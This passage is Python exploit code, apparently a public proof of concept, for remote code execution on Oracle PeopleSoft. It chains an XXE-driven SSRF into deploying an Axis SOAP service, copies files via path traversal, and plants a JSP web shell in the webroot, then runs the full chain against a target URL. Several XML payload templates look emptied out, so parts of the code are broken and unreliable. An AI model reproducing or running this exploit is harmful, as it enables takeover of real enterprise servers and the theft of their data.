            """
            return """
            """ % (self.service_name, CLASS_NAME)
        def soap_service_undeploy(self):
            """SOAP payload to undeploy the service.
            """
            return """
            """ % (self.service_name, )
        def xxe_ssrf(self, payload):
            """Runs the given AXIS deploy/undeploy payload through the XXE.
            """
            data = """
            ]>
               &x;
            """ % self.url_service(payload)
            r = self.post(
                '/PSIGW/HttpListeningConnector',
                data=self.pxml(data),
                headers={
                    'Content-Type': 'application/xml'
                }
            )
        def service_check(self):
            """Verifies that the service is correctly installed.
            """
            r = self.get('/pspc/services')
            return self.service_name in r.text
        def service_deploy(self):
            self.xxe_ssrf(self.soap_service_deploy())
            if not self.service_check():
                raise RuntimeError('Unable to deploy service')
            o('+', 'Service deployed')
        def service_undeploy(self):
            if not self.local_port:
                return
            self.xxe_ssrf(self.soap_service_undeploy())
            if self.service_check():
                o('-', 'Unable to undeploy service')
                return
            o('+', 'Service undeployed')
        def service_send(self, data):
            """Send data to the Axis endpoint.
            """
            return self.post(
                '/pspc/services/%s' % self.service_name,
                data=data,
                headers={
                    'SOAPAction': 'useless',
                    'Content-Type': 'application/xml'
                }
            )
        def service_copy(self, path0, path1):
            """Copies one file to another.
            """
            data = """
                %s
                %s
            """.strip() % (path0, path1)
            response = self.service_send(data)
            return '
                    %s
                    %s
                    %s.war
                    something
                    -addToEntityReg
            """.strip() % (tmp_path, tmp_dir, tmp_dir, PAYLOAD)
            response = self.service_send(data)
        def build_shell(self):
            """Builds a SYSTEM shell.
            """
            # On versions >= 8.50, using another extension than JSP got 70 bytes
            # in return every time, for some reason.
            # Using .jsp seems to trigger caching, thus the same pivot cannot be
            # used to extract several files.
            # Again, this is just from experience, nothing confirmed
            pivot = '/%s.jsp' % self.random_string(20)
            pivot_path = self.war_path('PSOL') + pivot
            pivot_url = '/PSOL' + pivot
            # 1: Copy portletentityregistry.xml to TMP
            per = '/WEB-INF/data/portletentityregistry.xml'
            per_path = self.war_path('pspc')
            tmp_path = '../' * 20 + 'TEMP'
            tmp_dir = self.random_string(20)
            tmp_per = tmp_path + '/' + tmp_dir + per
            if not self.service_copy(per_path + per, tmp_per):
                raise RuntimeError('Unable to copy original XML file')
            # 2: Add JSP payload
            self.service_main(tmp_path, tmp_dir)
            # 3: Copy XML to JSP in webroot
            if not self.service_copy(tmp_per, pivot_path):
                raise RuntimeError('Unable to copy modified XML file')
            response = self.get(pivot_url)
            if response.status_code != 200:
                raise RuntimeError('Unable to access JSP shell')
            o('+', 'Shell URL: ' + self.url + pivot_url)
    class PeopleSoftRCE(AxisDeploy):
        def __init__(self, url):
            super().__init__(url)
    def o(s, message):
        if colorama:
            c = COLORS[s]
            s = colorama.Style.BRIGHT + COLORS[s] + '|' + colorama.Style.RESET_ALL
        print('%s %s' % (s, message))
    x = PeopleSoftRCE(URL)
    try:
        x.check_all()
        x.service_deploy()
        x.build_shell()
    except RuntimeError as e:
        o('-', e)
    finally:
        x.service_undeploy()